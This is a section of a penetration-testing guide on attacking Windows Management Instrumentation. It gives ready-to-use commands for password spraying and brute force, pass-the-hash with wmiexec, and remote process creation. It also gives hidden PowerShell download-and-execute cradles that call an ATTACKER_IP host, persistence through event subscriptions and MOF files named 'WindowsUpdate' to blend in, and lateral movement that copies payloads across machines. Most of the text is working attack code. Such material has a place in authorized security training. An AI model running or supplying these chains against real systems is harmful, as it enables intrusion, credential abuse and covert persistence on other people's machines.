# 6. WMI - COMPLETE ATTACK CHAIN <a name="wmi"></a>

## 6.1 THEORY & BACKGROUND

**Windows Management Instrumentation (WMI)**:
- **Purpose**: Microsoft's implementation of web-based enterprise management
- **Protocols**: DCOM (port 135 + high ports) or WinRM (ports 5985/5986)
- **Use**: Remote system administration, queries, command execution
- **Common in**: Windows environments, Active Directory

**How WMI Works**:
1. Client connects to target via DCOM or WinRM
2. Authentication via NTLM/Kerberos
3. WMI queries or method invocations executed
4. Results returned to client

**WMI Classes** (key ones for pentesting):
- `Win32_Process` - Create/kill processes
- `Win32_Service` - Service management
- `Win32_UserAccount` - User enumeration
- `Win32_ComputerSystem` - System information
- `Win32_OperatingSystem` - OS details
- `Win32_NetworkAdapterConfiguration` - Network info

---

## 6.2 ENUMERATION PHASE

**Scan for WMI Access (DCOM):**
```bash
# Nmap scan for RPC:
nmap -p 135 --open 192.168.1.0/24

# More comprehensive:
nmap -p 135,139,445,593 -sV 192.168.1.100

# Check if accessible:
crackmapexec smb 192.168.1.100 -u guest -p ''
```

**From Windows:**
```powershell
# Test WMI connectivity:
Test-Connection 192.168.1.100
Get-WmiObject -Class Win32_OperatingSystem -ComputerName 192.168.1.100

# Check if WMI service running:
Get-Service -Name Winmgmt
```

---

## 6.3 EXPLOITATION PHASE

### 6.3.1 WMI Authentication Attacks

**From Linux (Impacket):**
```bash
# WMI query with credentials:
wmiexec.py domain/username:password@192.168.1.100

# Local account:
wmiexec.py administrator:Password123!@192.168.1.100

# Pass-the-hash:
wmiexec.py -hashes :NTLM_HASH administrator@192.168.1.100

# Example:
wmiexec.py administrator:Admin123!@192.168.1.100
# Drops into semi-interactive shell

# Execute single command:
wmiexec.py administrator:Admin123!@192.168.1.100 "whoami"

# Domain credentials:
wmiexec.py CORP/administrator:Admin123!@192.168.1.100

# Multiple targets:
for ip in $(cat targets.txt); do
    wmiexec.py administrator:Admin123!@$ip "hostname" 2>/dev/null && echo "$ip - SUCCESS"
done
```

**Credential Brute Force:**
```bash
# Using crackmapexec:
crackmapexec wmi 192.168.1.100 -u administrator -p passwords.txt

# Multiple users:
crackmapexec wmi 192.168.1.100 -u users.txt -p passwords.txt

# Password spray across network:
crackmapexec wmi 192.168.1.0/24 -u administrator -p 'Summer2023!' --continue-on-success

# With domain:
crackmapexec wmi 192.168.1.100 -u administrator -p 'Admin123!' -d CORP

# Pass-the-hash:
crackmapexec wmi 192.168.1.100 -u administrator -H 'NTLM_HASH'
```

**From Windows:**
```powershell
# Create credential object:
$username = "administrator"
$password = ConvertTo-SecureString "Admin123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)

# Execute WMI command:
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\output.txt" -ComputerName 192.168.1.100 -Credential $cred

# Get results:
Get-Content \\192.168.1.100\C$\output.txt

# Direct query:
Get-WmiObject -Class Win32_OperatingSystem -ComputerName 192.168.1.100 -Credential $cred

# Brute force (PowerShell):
$passwords = Get-Content passwords.txt
foreach ($pass in $passwords) {
    $password = ConvertTo-SecureString $pass -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential("administrator", $password)
    
    try {
        Get-WmiObject -Class Win32_OperatingSystem -ComputerName 192.168.1.100 -Credential $cred -ErrorAction Stop | Out-Null
        Write-Host "[+] Success: administrator : $pass"
        break
    } catch {
        Write-Host "[-] Failed: $pass"
    }
}
```

### 6.3.2 Remote Code Execution via WMI

**Method 1: Process Creation**

From Linux:
```bash
# Interactive shell:
wmiexec.py administrator:Admin123!@192.168.1.100

# Commands available:
whoami
hostname
ipconfig
net user
net localgroup administrators
```

From Windows:
```powershell
# Create process remotely:
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -nop -w hidden -c `"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')`"" -ComputerName 192.168.1.100 -Credential $cred

# Simpler command execution:
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\temp\output.txt" -ComputerName 192.168.1.100 -Credential $cred

# Read output:
Get-Content \\192.168.1.100\C$\temp\output.txt
```

**Method 2: WMI Event Subscription (Persistence)**

```powershell
# Create filter (triggers every 60 seconds):
$filter = ([wmiclass]"\\192.168.1.100\root\subscription:__EventFilter").CreateInstance()
$filter.QueryLanguage = "WQL"
$filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$filter.Name = "WindowsUpdate"
$filter.EventNamespace = 'root\cimv2'
$filterResult = $filter.Put()

# Create consumer (what to execute):
$consumer = ([wmiclass]"\\192.168.1.100\root\subscription:CommandLineEventConsumer").CreateInstance()
$consumer.Name = "WindowsUpdate"
$consumer.CommandLineTemplate = "powershell.exe -NoP -W Hidden -C IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')"
$consumerResult = $consumer.Put()

# Bind filter to consumer:
$binding = ([wmiclass]"\\192.168.1.100\root\subscription:__FilterToConsumerBinding").CreateInstance()
$binding.Filter = $filterResult
$binding.Consumer = $consumerResult
$bindingResult = $binding.Put()

# Payload executes every 60 seconds!

# List WMI subscriptions:
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -ComputerName 192.168.1.100
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -ComputerName 192.168.1.100
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -ComputerName 192.168.1.100

# Remove persistence:
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='WindowsUpdate'" -ComputerName 192.168.1.100 | Remove-WmiObject
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='WindowsUpdate'" -ComputerName 192.168.1.100 | Remove-WmiObject
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%WindowsUpdate%'" -ComputerName 192.168.1.100 | Remove-WmiObject
```

---

## 6.4 INFORMATION GATHERING VIA WMI

**System Information:**
```powershell
# OS details:
Get-WmiObject -Class Win32_OperatingSystem -ComputerName 192.168.1.100

# Computer info:
Get-WmiObject -Class Win32_ComputerSystem -ComputerName 192.168.1.100

# BIOS:
Get-WmiObject -Class Win32_BIOS -ComputerName 192.168.1.100

# Installed software:
Get-WmiObject -Class Win32_Product -ComputerName 192.168.1.100

# Running processes:
Get-WmiObject -Class Win32_Process -ComputerName 192.168.1.100

# Services:
Get-WmiObject -Class Win32_Service -ComputerName 192.168.1.100

# Startup programs:
Get-WmiObject -Class Win32_StartupCommand -ComputerName 192.168.1.100

# Users:
Get-WmiObject -Class Win32_UserAccount -ComputerName 192.168.1.100

# Groups:
Get-WmiObject -Class Win32_Group -ComputerName 192.168.1.100

# Network config:
Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True" -ComputerName 192.168.1.100

# Shares:
Get-WmiObject -Class Win32_Share -ComputerName 192.168.1.100

# Logical disks:
Get-WmiObject -Class Win32_LogicalDisk -ComputerName 192.168.1.100

# Event log:
Get-WmiObject -Class Win32_NTLogEvent -Filter "LogFile='Security'" -ComputerName 192.168.1.100 | Select-Object -First 100

# Scheduled tasks (via WMI):
Get-WmiObject -Class MSFT_ScheduledTask -Namespace root\Microsoft\Windows\TaskScheduler -ComputerName 192.168.1.100

# Registry read (via StdRegProv):
$reg = Get-WmiObject -List -Namespace root\default -ComputerName 192.168.1.100 | Where-Object {$_.Name -eq "StdRegProv"}
$HKLM = 2147483650
$reg.GetStringValue($HKLM, "SOFTWARE\Microsoft\Windows\CurrentVersion", "ProgramFilesDir")
```

**From Linux (wmic):**
```bash
# If wmic is available:
wmic -U 'administrator%Admin123!' //192.168.1.100 "SELECT * FROM Win32_OperatingSystem"

# Using impacket:
# Create simple query script:
python3 << EOF
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi

dcom = DCOMConnection('192.168.1.100', 'administrator', 'Admin123!')
iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)

iEnumWbemClassObject = iWbemServices.ExecQuery('SELECT * FROM Win32_OperatingSystem')
while True:
    obj = iEnumWbemClassObject.Next(0xffffffff,1)[0]
    if obj is None:
        break
    obj.getProperties()
    for prop in obj:
        print(prop)
EOF
```

---

## 6.5 LATERAL MOVEMENT & POST-EXPLOITATION

**Lateral Movement:**
```powershell
# Execute on multiple targets:
$computers = Get-Content targets.txt
foreach ($computer in $computers) {
    Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -c `"whoami`"" -ComputerName $computer -Credential $cred
}

# Copy and execute:
Copy-Item -Path .\payload.exe -Destination \\192.168.1.100\C$\Windows\Temp\
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "C:\Windows\Temp\payload.exe" -ComputerName 192.168.1.100 -Credential $cred

# Use WMI for file transfer:
# On attacker: host file via SMB or HTTP
# On target via WMI:
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -c `"(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/payload.exe','C:\Windows\Temp\payload.exe')`"" -ComputerName 192.168.1.100 -Credential $cred

# Execute:
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "C:\Windows\Temp\payload.exe" -ComputerName 192.168.1.100 -Credential $cred
```

**WMI Persistence:**
```powershell
# Already covered WMI event subscriptions above

# Alternative: MOF file persistence (legacy):
# Create MOF file:
$mof = @"
#pragma namespace("\\\\.\\root\\subscription")

instance of __EventFilter as `$EventFilter
{
    Name = "WindowsUpdate";
    EventNamespace = "root\\cimv2";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'";
    QueryLanguage = "WQL";
};

instance of CommandLineEventConsumer as `$Consumer
{
    Name = "WindowsUpdate";
    CommandLineTemplate = "powershell.exe -NoP -W Hidden -C IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')";
};

instance of __FilterToConsumerBinding
{
    Filter = `$EventFilter;
    Consumer = `$Consumer;
};
"@

# Copy to target:
$mof | Out-File -FilePath \\192.168.1.100\C$\Windows\System32\wbem\WindowsUpdate.mof

# It auto-compiles and persists!
```

---